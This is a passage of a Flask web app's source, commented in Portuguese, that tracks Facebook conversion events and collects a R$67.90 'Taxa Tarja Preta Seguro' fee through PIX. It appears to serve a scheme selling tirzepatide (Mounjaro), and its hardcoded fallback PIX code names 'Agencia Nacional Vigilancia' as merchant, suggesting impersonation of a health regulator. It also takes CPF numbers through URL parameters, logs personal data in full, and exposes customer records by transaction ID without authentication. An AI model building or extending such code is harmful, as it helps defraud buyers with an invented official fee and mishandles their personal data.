    Endpoint para processar eventos de lead do Facebook Conversion API
    Este endpoint recebe dados do cliente via AJAX quando o usuário clica no botão
    "Prosseguir para detalhes do produto" na página de endereço
    """
    try:
        app.logger.info("[FACEBOOK] Recebendo evento Lead via AJAX")
        
        if not request.is_json:
            app.logger.error("[FACEBOOK] Requisição inválida: formato JSON esperado")
            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
            
        data = request.json
        form_data = data.get('formData', {})
        
        app.logger.info(f"[FACEBOOK] Dados do formulário recebidos: {form_data}")
        
        # Extrair dados do usuário do formulário para enviar ao evento Lead
        user_data = {}
        
        # Se tiver informações no formulário e/ou na sessão, usar para o evento
        if 'nome' in session and session['nome']:
            nome_completo = session['nome'].split()
            if len(nome_completo) >= 1:
                first_name = nome_completo[0]
                last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
                user_data['first_name'] = first_name
                user_data['last_name'] = last_name
        
        # Incluir telefone se disponível
        phone = form_data.get('phone') or session.get('phone')
        if phone:
            user_data['phone'] = phone
            
        # Incluir CPF como external_id se disponível
        cpf = session.get('cpf')
        if cpf:
            user_data['external_id'] = cpf
            
        # Adicionar dados de localização
        if 'city' in form_data:
            user_data['city'] = form_data['city']
        if 'state' in form_data:
            user_data['state'] = form_data['state']
            
        try:
            # Importar funções da API de Conversão do Facebook
            from facebook_conversion_api import track_lead, prepare_user_data
            
            # Preparar dados do usuário com hash para o evento
            hashed_user_data = prepare_user_data(
                first_name=user_data.get('first_name'),
                last_name=user_data.get('last_name'),
                phone=user_data.get('phone'),
                city=user_data.get('city'),
                state=user_data.get('state'),
                external_id=user_data.get('external_id')
            )
            
            # Enviar evento Lead
            result = track_lead(value=None)  # Sem valor monetário neste estágio
            
            app.logger.info(f"[FACEBOOK] Evento Lead enviado com sucesso: {result}")
            return jsonify({'success': True, 'message': 'Evento Lead registrado com sucesso'})
            
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento Lead: {str(fb_error)}")
            return jsonify({'success': False, 'error': f'Erro ao processar evento: {str(fb_error)}'}), 500
            
    except Exception as e:
        app.logger.error(f"[FACEBOOK] Erro ao processar evento Lead: {str(e)}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500

# Rotas de demonstração para UTM
@app.route('/utm-demo')
@app.route('/utm-demo/<page>')
def utm_demo(page=None):
    """
    Página de demonstração da preservação de parâmetros UTM
    Útil para testar e verificar o funcionamento da preservação de UTMs
    """
    try:
        app.logger.info(f"[UTM-DEMO] Acessando página de demonstração UTM: {page}")
        
        # Tentar enviar evento PageView para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_page_view
            track_page_view(url=request.url)
            app.logger.info("[FACEBOOK] Evento PageView enviado para página de demonstração UTM")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento PageView para UTM demo: {str(fb_error)}")
        
        # Obter parâmetros UTM da sessão
        utm_params = session.get('utm_params', {})
        
        # Preparar dados para o template
        template_data = {
            'utm_params': utm_params,
            'utm_source': session.get('utm_source', ''),
            'utm_medium': session.get('utm_medium', ''),
            'utm_campaign': session.get('utm_campaign', ''),
            'utm_content': session.get('utm_content', ''),
            'utm_term': session.get('utm_term', ''),
            'fbclid': session.get('fbclid', ''),
            'gclid': session.get('gclid', ''),
            'ttclid': session.get('ttclid', ''),
            'page': page
        }
        
        # Retornar template com dados
        return render_template('utm_demo.html', **template_data)
    except Exception as e:
        app.logger.error(f"[UTM-DEMO] Erro ao acessar página de demonstração UTM: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/utm-demo/form', methods=['GET', 'POST'])
def utm_demo_form():
    """
    Formulário de demonstração para testar preservação de UTM durante submissão de formulários
    """
    try:
        if request.method == 'POST':
            # Processar formulário
            app.logger.info("[UTM-DEMO] Formulário submetido")
            
            # Enviar evento Lead para o Facebook Conversion API
            try:
                from facebook_conversion_api import track_lead
                track_lead()
                app.logger.info("[FACEBOOK] Evento Lead enviado para formulário UTM demo")
            except Exception as fb_error:
                app.logger.error(f"[FACEBOOK] Erro ao enviar evento Lead: {str(fb_error)}")
            
            # Redirecionar para página de agradecimento, preservando UTMs via JavaScript
            return redirect(url_for('utm_demo', page='thanks'))
        
        # Se for GET, mostrar o formulário
        utm_params = session.get('utm_params', {})
        return render_template('utm_demo.html', 
                            utm_params=utm_params,
                            utm_source=session.get('utm_source', ''),
                            utm_medium=session.get('utm_medium', ''),
                            utm_campaign=session.get('utm_campaign', ''),
                            utm_content=session.get('utm_content', ''),
                            utm_term=session.get('utm_term', ''),
                            fbclid=session.get('fbclid', ''),
                            gclid=session.get('gclid', ''),
                            ttclid=session.get('ttclid', ''),
                            page='form')
    except Exception as e:
        app.logger.error(f"[UTM-DEMO] Erro no formulário de demonstração UTM: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

# Rotas para a Taxa Tarja Preta Seguro (TTPS)
@app.route('/ttps')
def ttps():
    """
    Página da Taxa Tarja Preta Seguro (TTPS)
    Exibe informações sobre a taxa e opções de pagamento
    """
    try:
        app.logger.info("[PROD] Acessando página da Taxa Tarja Preta Seguro")
        
        # Recuperar dados da sessão (útil para personalizar a mensagem)
        customer_name = session.get('nome', '')
        customer_cpf = session.get('cpf', '')
        
        return render_template('ttps.html', 
                              customer_name=customer_name, 
                              customer_cpf=customer_cpf)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página TTPS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/pagar-ttps', methods=['GET', 'POST'])
def pagar_ttps():
    """
    Página de pagamento da Taxa Tarja Preta Seguro (TTPS)
    Suporta GET para carregar a página e POST para criar novo pagamento via AJAX
    """
    try:
        app.logger.info("[PROD] Acessando página de pagamento da Taxa TTPS")
        
        # Verificar se é uma requisição AJAX (POST com JSON)
        is_ajax = request.headers.get('X-Requested-With') == 'XMLHttpRequest' and request.method == 'POST'
        
        # Verificar se há parâmetros na URL (nova abordagem) ou se é AJAX (antiga abordagem)
        if request.args.get('name') and request.args.get('cpf'):
            # Processar dados dos parâmetros da URL
            app.logger.info("[PROD] Recebendo dados via parâmetros de URL para pagamento TTPS")
            
            # Extair dados dos parâmetros
            url_params = {
                'name': request.args.get('name'),
                'cpf': request.args.get('cpf'),
                'email': request.args.get('email', 'cliente@example.com'),
                'phone': request.args.get('phone', '11999999999')
            }
            
            app.logger.info(f"[PROD] Dados recebidos via URL: {url_params}")
            
            # Validar dados mínimos necessários
            if not url_params['name'] or not url_params['cpf']:
                app.logger.error("[PROD] Dados insuficientes para gerar pagamento TTPS via URL")
                return render_template('error.html', 
                                     message="Dados incompletos para gerar pagamento. Por favor, tente novamente."), 400
            
            # Preparar dados para o formato esperado pelo restante do código
            user_data = {
                'name': url_params['name'],
                'cpf': url_params['cpf'],
                'email': url_params['email'],
                'phone': url_params['phone']
            }
            
            # Atualizar a sessão com os dados recebidos
            session['nome'] = user_data['name']
            session['cpf'] = user_data['cpf']
            session['email'] = user_data['email']
            session['phone'] = user_data['phone']
            
            app.logger.info(f"[PROD] Dados do pagamento TTPS armazenados na sessão: {user_data}")
            
        # Se for AJAX, processar os dados enviados pelo cliente e retornar JSON
        elif is_ajax:
            app.logger.info("[PROD] Recebendo requisição AJAX para gerar pagamento TTPS")
            
            # Obter dados do corpo da requisição
            try:
                user_data_json = request.get_json()
                app.logger.info(f"[PROD] Dados recebidos via AJAX: {user_data_json}")
                
                # Validar dados mínimos necessários
                if not user_data_json or not user_data_json.get('name') or not user_data_json.get('cpf'):
                    app.logger.error("[PROD] Dados insuficientes para gerar pagamento TTPS via AJAX")
                    return jsonify({
                        'success': False,
                        'message': 'Dados insuficientes para gerar pagamento'
                    }), 400
                
                # Preparar dados para o formato esperado pelo restante do código
                user_data = {
                    'name': user_data_json.get('name'),
                    'cpf': user_data_json.get('cpf'),
                    'email': user_data_json.get('email', 'cliente@example.com'),
                    'phone': user_data_json.get('phone', '11999999999')
                }
                
                # Atualizar a sessão com os dados recebidos
                session['nome'] = user_data['name']
                session['cpf'] = user_data['cpf']
                session['email'] = user_data['email']
                session['phone'] = user_data['phone']
                
                app.logger.info(f"[PROD] Dados do pagamento TTPS armazenados na sessão: {user_data}")
            except Exception as e:
                app.logger.error(f"[PROD] Erro ao processar dados JSON para pagamento TTPS: {str(e)}")
                return jsonify({
                    'success': False,
                    'message': 'Erro ao processar dados do pagamento'
                }), 400
        else:
            # Se for acesso normal via GET sem parâmetros, usar dados da sessão ou valores padrão
            app.logger.info("[PROD] Acesso normal à página de pagamento TTPS via GET sem parâmetros")
            user_data = {
                'name': session.get('nome', 'Cliente Teste'),
                'cpf': session.get('cpf', '12345678900'),
                'email': session.get('email', 'teste@exemplo.com'),
                'phone': session.get('phone', '11999999999')
            }
        
        # Valor da TTPS
        ttps_value = 67.90
        transaction_id = ""
        
        # Gerar pagamento na For4Payments
        try:
            app.logger.info(f"[PROD] Gerando pagamento For4 para TTPS no valor de R$ {ttps_value}")
            
            # Importar API da For4Payments
            from for4pagamentos import create_payment_api
            
            # Criar instância da API
            api = create_payment_api()
            
            # Preparar dados para o pagamento
            payment_data = {
                'name': user_data['name'],
                'cpf': user_data['cpf'],
                'email': user_data['email'],
                'phone': user_data['phone'],
                'amount': ttps_value,
                'description': "Taxa Tarja Preta Seguro (TTPS)",
                'external_id': f"TTPS-{random.randint(10000000, 99999999)}"
            }
            
            # Criar pagamento PIX
            payment_response = api.create_pix_payment(payment_data)
            
            # Log completo da resposta para depuração
            app.logger.info(f"[PROD] Resposta completa da For4: {payment_response}")
            
            # Verificar se a API retornou dados, mesmo com 'success' como False
            if payment_response.get('data'):
                # A API às vezes retorna os dados mesmo quando marca como falha
                app.logger.info(f"[PROD] Dados encontrados na resposta, mesmo com success={payment_response.get('success')}")
                payment_info = payment_response.get('data', {})
            else:
                # Inicializar com dicionário vazio se não houver dados
                payment_info = {}
                
            # Log detalhado dos dados retornados para debugging
            app.logger.info(f"[PROD] Dados do pagamento extraídos da For4: {payment_info}")
            
            # Tente obter os dados de diversas formas possíveis considerando as diferentes estruturas retornadas pela API
            
            # Tenta obter o código PIX (copia e cola) diretamente da resposta ou dentro do data
            pix_code = (
                # Formato específico da For4 encontrado nos logs
                payment_response.get('pixCode') or
                payment_info.get('pixCode') or
                # Outras variações possíveis
                payment_response.get('qr_code_text') or 
                payment_response.get('copy_paste') or
                payment_response.get('code') or 
                payment_response.get('pix_code') or
                payment_response.get('copiaecola') or
                (payment_response.get('pix', {}) or {}).get('code') or
                # Dentro do campo data
                payment_info.get('qr_code_text') or
                payment_info.get('copy_paste') or
                payment_info.get('code') or 
                payment_info.get('pix_code') or
                payment_info.get('copiaecola') or
                (payment_info.get('pix', {}) or {}).get('code') or 
                (payment_info.get('pix', {}) or {}).get('copy_paste')
            )
            
            # Se ainda não encontrou, tente buscar dentro de outros subcampos possíveis
            if not pix_code:
                for field in ['pixInfo', 'pixData', 'payment', 'transaction', 'result']:
                    if field in payment_info:
                        sub_data = payment_info.get(field, {})
                        pix_code = (
                            sub_data.get('qr_code_text') or
                            sub_data.get('copy_paste') or
                            sub_data.get('code') or 
                            sub_data.get('pix_code') or
                            sub_data.get('copiaecola') or
                            (sub_data.get('pix', {}) or {}).get('code') or 
                            pix_code
                        )
                        if pix_code:
                            app.logger.info(f"[PROD] Código PIX encontrado no campo {field}")
                            break
            
            # Tenta obter a URL ou dados da imagem do QR code - mesmo processo
            qr_code_url = (
                # Formato específico da For4 encontrado nos logs
                payment_response.get('pixQrCode') or
                payment_info.get('pixQrCode') or
                # Outras variações possíveis
                payment_response.get('qr_code_image') or
                payment_response.get('qrcode') or
                payment_response.get('qr_code') or
                payment_response.get('pix_qr_code') or
                payment_response.get('qr_code_url') or
                (payment_response.get('pix', {}) or {}).get('qrcode') or
                # Dentro do campo data
                payment_info.get('qr_code_image') or
                payment_info.get('qrcode') or
                payment_info.get('qr_code') or
                payment_info.get('pix_qr_code') or
                payment_info.get('qr_code_url') or
                (payment_info.get('pix', {}) or {}).get('qrcode') or
                (payment_info.get('pix', {}) or {}).get('qr_code_image')
            )
            
            # Se ainda não encontrou, tente buscar dentro de outros subcampos possíveis
            if not qr_code_url:
                for field in ['pixInfo', 'pixData', 'payment', 'transaction', 'result']:
                    if field in payment_info:
                        sub_data = payment_info.get(field, {})
                        qr_code_url = (
                            sub_data.get('pixQrCode') or
                            sub_data.get('qr_code_image') or
                            sub_data.get('qrcode') or
                            sub_data.get('qr_code') or
                            sub_data.get('pix_qr_code') or
                            sub_data.get('qr_code_url') or
                            (sub_data.get('pix', {}) or {}).get('qrcode') or
                            qr_code_url
                        )
                        if qr_code_url:
                            app.logger.info(f"[PROD] QR code URL encontrado no campo {field}")
                            break
            
            # Tenta obter o ID da transação - mesmo processo
            transaction_id = (
                # Diretamente da resposta
                payment_response.get('transaction_id') or
                payment_response.get('id') or
                payment_response.get('transactionId') or
                payment_response.get('payment_id') or
                # Dentro do campo data
                payment_info.get('transaction_id') or
                payment_info.get('id') or
                payment_info.get('transactionId') or
                payment_info.get('payment_id')
            )
            
            # Se ainda não encontrou, tente buscar dentro de outros subcampos possíveis
            if not transaction_id:
                for field in ['payment', 'transaction', 'result']:
                    if field in payment_info:
                        sub_data = payment_info.get(field, {})
                        transaction_id = (
                            sub_data.get('transaction_id') or
                            sub_data.get('id') or
                            sub_data.get('transactionId') or
                            sub_data.get('payment_id') or
                            transaction_id
                        )
                        if transaction_id:
                            app.logger.info(f"[PROD] ID da transação encontrado no campo {field}")
                            break
            
            # Se ainda não encontrou, gerar um ID aleatório
            if not transaction_id:
                transaction_id = f"TTPS-{random.randint(10000000, 99999999)}"
            
            # Verificar se conseguimos extrair os dados necessários
            if pix_code and qr_code_url:
                app.logger.info(f"[PROD] Dados de PIX extraídos com sucesso")
                app.logger.info(f"[PROD] Código PIX extraído: {pix_code[:30]}...")
                app.logger.info(f"[PROD] URL do QR code extraído: {qr_code_url[:50]}...")
                app.logger.info(f"[PROD] ID da transação: {transaction_id}")
                
                # Armazenar o ID da transação na sessão para verificação posterior
                session['ttps_transaction_id'] = transaction_id
                
                app.logger.info(f"[PROD] Pagamento For4 processado com sucesso: ID {transaction_id}")
            else:
                app.logger.error(f"[PROD] Não foi possível extrair os dados de PIX da resposta")
                
                # Para desenvolvimento, usar dados de exemplo apenas se necessário
                if not pix_code:
                    app.logger.warning("[PROD] Usando código PIX de exemplo para desenvolvimento")
                    pix_code = "00020101021226580014br.gov.bcb.pix01361234567890123456789012345678901020051505654041.005802BR5925Agencia Nacional Vigilancia6009SAO PAULO61080540900062070503***63048F74"
                
                if not qr_code_url:
                    app.logger.warning("[PROD] Gerando QR code a partir do código PIX")
                    # Gerar QR code para o código PIX
                    import qrcode
                    from io import BytesIO
                    import base64
                    
                    # Criando o QR Code
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_L,
                        box_size=10,
                        border=4,
                    )
                    qr.add_data(pix_code)
                    qr.make(fit=True)
                    
                    # Convertendo para imagem
                    img = qr.make_image(fill_color="black", back_color="white")
                    
                    # Salvando em um buffer de memória e convertendo para Base64
                    buffer = BytesIO()
                    img.save(buffer, format="PNG")
                    qr_code_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    qr_code_url = f"data:image/png;base64,{qr_code_base64}"
                
                # Armazenar o ID da transação na sessão para verificação posterior
                session['ttps_transaction_id'] = transaction_id
        
        except Exception as payment_error:
            app.logger.error(f"[PROD] Exceção ao gerar pagamento For4: {str(payment_error)}")
            
            # Em caso de exceção, usar dados de exemplo para desenvolvimento
            pix_code = "00020101021226580014br.gov.bcb.pix01361234567890123456789012345678901020051505654041.005802BR5925Agencia Nacional Vigilancia6009SAO PAULO61080540900062070503***63048F74"
            
            # Gerar QR code para o código PIX de exemplo
            import qrcode
            from io import BytesIO
            import base64
            
            # Criando o QR Code
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            qr.add_data(pix_code)
            qr.make(fit=True)
            
            # Convertendo para imagem
            img = qr.make_image(fill_color="black", back_color="white")
            
            # Salvando em um buffer de memória e convertendo para Base64
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            qr_code_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            qr_code_url = f"data:image/png;base64,{qr_code_base64}"
            
            transaction_id = f"TTPS-{random.randint(10000000, 99999999)}"
            session['ttps_transaction_id'] = transaction_id
        
        # Gerar ID aleatório para o protocolo
        random_id = ''.join(random.choices(string.digits, k=4))
        
        # Registrar evento de InitiateCheckout no Facebook CAPI
        try:
            from facebook_conversion_api import track_initiate_checkout
            
            # Enviar evento
            track_initiate_checkout(value=ttps_value)
            app.logger.info(f"[FACEBOOK] Evento InitiateCheckout enviado para TTPS com valor {ttps_value}")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento InitiateCheckout para TTPS: {str(fb_error)}")
        
        # Se for uma requisição AJAX, retornar dados em formato JSON
        if is_ajax:
            return jsonify({
                'success': True,
                'pix_code': pix_code,
                'qr_code_url': qr_code_url,
                'transaction_id': transaction_id
            })
        else:
            # Capturar parâmetros UTM para preservá-los
            utm_params = {}
            utm_keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'fbclid', 'gclid', 'ttclid']
            
            # Verificar UTMs na URL atual
            for key in utm_keys:
                if key in request.args:
                    utm_params[key] = request.args.get(key)
            
            # Se não houver UTMs na URL, verificar na sessão
            if not utm_params and 'utm_params' in session:
                utm_params = session.get('utm_params', {})
            
            # Log dos parâmetros UTM encontrados
            if utm_params:
                app.logger.info(f"[UTM] Parâmetros UTM preservados na página de pagamento TTPS: {utm_params}")
                # Armazenar UTMs na sessão para uso futuro
                session['utm_params'] = utm_params
            else:
                app.logger.warning("[UTM] Nenhum parâmetro UTM encontrado para página de pagamento TTPS")
            
            # Se for acesso normal via GET, renderizar o template com parâmetros UTM
            return render_template('pagar_ttps_new.html', 
                                   pix_code=pix_code,
                                   qr_code_url=qr_code_url,
                                   random_id=random_id,
                                   user_data=user_data,
                                   transaction_id=transaction_id,
                                   utm_params=utm_params)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de pagamento TTPS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/verificar-pagamento-ttps')
def verificar_pagamento_ttps():
    """
    Endpoint para verificar o status do pagamento TTPS
    """
    try:
        transaction_id = session.get('ttps_transaction_id', '')
        
        if not transaction_id:
            app.logger.warning("[PROD] Tentativa de verificar pagamento TTPS sem ID de transação")
            return jsonify({
                'success': False,
                'status': 'error',
                'message': 'ID de transação não encontrado'
            }), 400
        
        app.logger.info(f"[PROD] Verificando status do pagamento TTPS: {transaction_id}")
        
        # Verificar pagamento usando o gateway configurado
        try:
            # Importar função de gateway
            from payment_gateway import get_payment_gateway
            
            # Obter instância do gateway configurado
            api = get_payment_gateway()
            
            # Verificar status do pagamento
            payment_status = api.check_payment_status(transaction_id)
            
            # Verificar se a resposta foi bem-sucedida
            if payment_status.get('success'):
                status_data = payment_status.get('data', {})
                
                # Log detalhado dos dados de status retornados
                app.logger.info(f"[PROD] Dados de status do pagamento retornados pela For4: {status_data}")
                
                # Tenta extrair o status de diversas formas possíveis
                status = (
                    status_data.get('status') or
                    status_data.get('payment_status') or
                    status_data.get('transaction_status') or
                    status_data.get('pix_status') or
                    'pending'
                ).upper()
                
                app.logger.info(f"[PROD] Status do pagamento extraído: {status}")
                
                # Mapear diversos formatos de status para o nosso formato interno
                status_mapping = {
                    'PAID': 'paid',
                    'COMPLETED': 'paid',
                    'APPROVED': 'paid',
                    'PAGO': 'paid',
                    'CONFIRMED': 'paid',
                    'PENDING': 'pending',
                    'WAITING': 'pending',
                    'PENDENTE': 'pending',
                    'PROCESSING': 'pending',
                    'CANCELLED': 'failed',
                    'CANCELED': 'failed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'ERROR': 'failed'
                }
                
                mapped_status = status_mapping.get(status, 'pending')
                app.logger.info(f"[PROD] Status mapeado: {status} -> {mapped_status}")
                
                is_paid = mapped_status == 'paid'
                
                if is_paid:
                    app.logger.info(f"[PROD] Pagamento TTPS {transaction_id} confirmado")
                    
                    # Enviar evento de Purchase para o Facebook CAPI
                    try:
                        from facebook_conversion_api import track_purchase, prepare_user_data
                        
                        # Valor da TTPS
                        ttps_value = 67.90
                        
                        # Preparar dados do usuário para o evento (com hash)
                        user_data = {}
                        if 'nome' in session and session['nome']:
                            nome_completo = session['nome'].split()
                            if len(nome_completo) >= 1:
                                # Extrair primeiro e último nome para o evento
                                first_name = nome_completo[0]
                                last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
                                user_data = prepare_user_data(
                                    first_name=first_name,
                                    last_name=last_name,
                                    email=session.get('email'),
                                    phone=session.get('phone'),
                                    external_id=session.get('cpf')
                                )
                        
                        # Enviar evento
                        track_purchase(
                            value=float(ttps_value),
                            transaction_id=transaction_id,
                            content_name="Taxa Tarja Preta Seguro (TTPS)"
                        )
                        app.logger.info(f"[FACEBOOK] Evento Purchase enviado para TTPS com valor {ttps_value}")
                    except Exception as fb_error:
                        app.logger.error(f"[FACEBOOK] Erro ao enviar evento Purchase para TTPS: {str(fb_error)}")
                
                return jsonify({
                    'success': True,
                    'status': 'paid' if is_paid else 'pending',
                    'message': 'Pagamento confirmado' if is_paid else 'Pagamento pendente'
                })
            else:
                error_msg = payment_status.get('message', 'Erro desconhecido')
                app.logger.error(f"[PROD] Erro ao verificar pagamento For4: {error_msg}")
                
                # Em ambiente de desenvolvimento, permitir simular pagamento bem-sucedido
                is_dev = os.environ.get('FLASK_ENV') == 'development' or app.debug
                is_test = request.args.get('test') == 'true'
                if is_dev and is_test:
                    app.logger.info("[DESENVOLVIMENTO] Simulando pagamento TTPS bem-sucedido")
                    return jsonify({
                        'success': True,
                        'status': 'paid',
                        'message': 'Pagamento simulado com sucesso'
                    })
                
                return jsonify({
                    'success': False,
                    'status': 'error',
                    'message': error_msg
                }), 400
                
        except Exception as check_error:
            app.logger.error(f"[PROD] Exceção ao verificar pagamento For4: {str(check_error)}")
            
            # Em ambiente de desenvolvimento, permitir simular pagamento bem-sucedido
            is_dev = os.environ.get('FLASK_ENV') == 'development' or app.debug
            is_test = request.args.get('test') == 'true'
            if is_dev and is_test:
                app.logger.info("[DESENVOLVIMENTO] Simulando pagamento TTPS bem-sucedido")
                return jsonify({
                    'success': True,
                    'status': 'paid',
                    'message': 'Pagamento simulado com sucesso'
                })
            
            return jsonify({
                'success': False,
                'status': 'error',
                'message': f"Erro ao verificar pagamento: {str(check_error)}"
            }), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar pagamento TTPS: {str(e)}")
        return jsonify({
            'success': False,
            'status': 'error',
            'message': 'Erro interno do servidor'
        }), 500

@app.route('/ttps_sucesso')
def ttps_sucesso():
    """
    Página de sucesso após o pagamento da Taxa Tarja Preta Seguro (TTPS)
    """
    try:
        app.logger.info("[PROD] Acessando página de confirmação do pagamento TTPS")
        
        # Recuperar dados da sessão
        customer_name = session.get('nome', '')
        customer_cpf = session.get('cpf', '')
        
        # Capturar e preservar parâmetros UTM
        utm_params = {}
        utm_keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'fbclid', 'gclid', 'ttclid']
        
        # Verificar UTMs na URL atual
        for key in utm_keys:
            if key in request.args:
                utm_params[key] = request.args.get(key)
                # Atualizar também na sessão
                session[key] = request.args.get(key)
        
        # Se não houver UTMs na URL, verificar na sessão
        if not utm_params and 'utm_params' in session:
            utm_params = session.get('utm_params', {})
        
        # Log dos parâmetros UTM encontrados
        if utm_params:
            app.logger.info(f"[UTM] Parâmetros UTM preservados na página de sucesso TTPS: {utm_params}")
            # Atualizar a sessão com os UTMs
            session['utm_params'] = utm_params
        else:
            app.logger.warning("[UTM] Nenhum parâmetro UTM encontrado para página de sucesso TTPS")
        
        # Registrar evento de Purchase no Facebook CAPI
        try:
            from facebook_conversion_api import track_purchase, prepare_user_data
            
            # Valor da TTPS
            ttps_value = 67.90
            
            # Preparar dados do usuário para o evento (com hash)
            user_data = {}
            if 'nome' in session and session['nome']:
                nome_completo = session['nome'].split()
                if len(nome_completo) >= 1:
                    # Extrair primeiro e último nome para o evento
                    first_name = nome_completo[0]
                    last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
                    user_data = prepare_user_data(
                        first_name=first_name,
                        last_name=last_name,
                        email=session.get('email'),
                        phone=session.get('phone'),
                        external_id=session.get('cpf')
                    )
            
            # Usar o transaction_id da sessão se disponível, senão gerar um novo
            transaction_id = session.get('ttps_transaction_id') or f"TTPS-{random.randint(10000000, 99999999)}"
            
            # Enviar evento
            track_purchase(
                value=float(ttps_value),
                transaction_id=transaction_id,
                content_name="Taxa Tarja Preta Seguro (TTPS)"
            )
            app.logger.info(f"[FACEBOOK] Evento Purchase enviado para TTPS com valor {ttps_value}")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento Purchase para TTPS: {str(fb_error)}")
        
        return render_template('ttps_sucesso.html', 
                              customer_name=customer_name,
                              customer_cpf=customer_cpf,
                              utm_params=utm_params)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de sucesso TTPS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500


@app.route('/teste-eventos-facebook')
def teste_eventos_facebook():
    """Página para testar o depurador de eventos do Facebook Conversion API"""
    app.logger.info("[DEBUG] Acessando página de teste de eventos do Facebook")
    
    # Enviar evento PageView para o Facebook Conversion API
    try:
        from facebook_conversion_api import track_page_view, track_lead, track_purchase
        
        # Executar um evento PageView
        track_page_view(url=request.url)
        app.logger.info("[FACEBOOK] Evento PageView enviado para teste")
        
        # Esperar um pouco para o evento ser processado
        time.sleep(0.5)
        
        # Executar um evento Lead
        track_lead(value=100.0)
        app.logger.info("[FACEBOOK] Evento Lead enviado para teste")
        
        # Esperar um pouco para o evento ser processado
        time.sleep(0.5)
        
        # Executar um evento Purchase
        track_purchase(
            value=143.10,
            transaction_id="TESTE-" + str(int(time.time())),
            content_name="Teste de Compra"
        )
        app.logger.info("[FACEBOOK] Evento Purchase enviado para teste")
        
    except Exception as fb_error:
        app.logger.error(f"[FACEBOOK] Erro ao enviar eventos de teste: {str(fb_error)}")
    
    return render_template('teste_eventos_facebook.html')

@app.route('/api/send-facebook-event/<event_type>', methods=['POST'])
def send_facebook_event(event_type):
    """API para enviar eventos específicos do Facebook sob demanda"""
    app.logger.info(f"[DEBUG] Solicitação para enviar evento {event_type} do Facebook")
    
    try:
        from facebook_conversion_api import (
            track_page_view, track_view_content, track_lead, 
            track_initiate_checkout, track_add_payment_info, track_purchase
        )
        
        result = {'success': False, 'message': 'Tipo de evento não reconhecido'}
        
        # Mapear os tipos de evento para as funções correspondentes
        if event_type == 'pageview':
            result = track_page_view(url=request.url)[0]
            message = "PageView enviado com sucesso"
        
        elif event_type == 'viewcontent':
            result = track_view_content(
                content_name="Produto Teste",
                content_type="product"
            )[0]
            message = "ViewContent enviado com sucesso"
        
        elif event_type == 'lead':
            result = track_lead(value=100.0)[0]
            message = "Lead enviado com sucesso"
        
        elif event_type == 'checkout':
            result = track_initiate_checkout(value=143.10)[0]
            message = "InitiateCheckout enviado com sucesso"
        
        elif event_type == 'payment_info':
            result = track_add_payment_info()[0]
            message = "AddPaymentInfo enviado com sucesso"
        
        elif event_type == 'purchase':
            result = track_purchase(
                value=143.10,
                transaction_id="TESTE-" + str(int(time.time())),
                content_name="Produto de Teste"
            )[0]
            message = "Purchase enviado com sucesso"
        
        if result.get('success', False):
            app.logger.info(f"[FACEBOOK] {message}")
            return jsonify({
                'success': True,
                'message': message,
                'event_type': event_type,
                'event_id': result.get('eventId', '')
            })
        else:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento {event_type}: {result.get('message', '')}")
            return jsonify({
                'success': False,
                'message': f"Erro ao enviar evento {event_type}: {result.get('message', '')}",
                'event_type': event_type
            })
            
    except Exception as e:
        error_message = str(e)
        app.logger.error(f"[FACEBOOK] Exceção ao enviar evento {event_type}: {error_message}")
        return jsonify({
            'success': False,
            'message': f"Exceção ao enviar evento: {error_message}",
            'event_type': event_type
        }), 500

@app.route('/remarketing/<transaction_id>')
def remarketing(transaction_id):
    """Página de remarketing personalizada para clientes anteriores baseada no ID da transação"""
    try:
        print(f"[REMARKETING] Acessando remarketing para transação: {transaction_id}")
        app.logger.info(f"[REMARKETING] Acessando remarketing para transação: {transaction_id}")
        
        # Configurar valores padrão caso falhe a consulta ao gateway
        default_customer = {
            'transaction_id': transaction_id,
            'customer_name': 'Cliente',
            'customer_cpf': '',
            'customer_phone': '',
            'customer_email': '',
            'product_name': 'Mounjaro (Tirzepatida) 5mg',
            'amount': 143.10
        }
        
        # Valores padrão de PIX
        pix_code = ''
        qr_code_url = ''
        reviews = []
        
        # Buscar dados do pagamento diretamente no gateway
        try:
            # Importar e inicializar o gateway de pagamento
            import os
            # Verificar qual gateway está configurado
            # Usar o gateway de pagamento configurado
            from payment_gateway import get_payment_gateway
            gateway_choice = os.environ.get('GATEWAY_CHOICE', 'NOVAERA')
            print(f"[REMARKETING] Gateway configurado: {gateway_choice}")
            
            # Obter instância do gateway configurado
            api = get_payment_gateway()
            print(f"[REMARKETING] Usando gateway configurado para buscar dados da transação: {transaction_id}")
            
            # Verificar status do pagamento
            payment_data = api.check_payment_status(transaction_id)
            print(f"[REMARKETING] Dados do pagamento obtidos: {payment_data}")
            
            # Extrair campos do pagamento
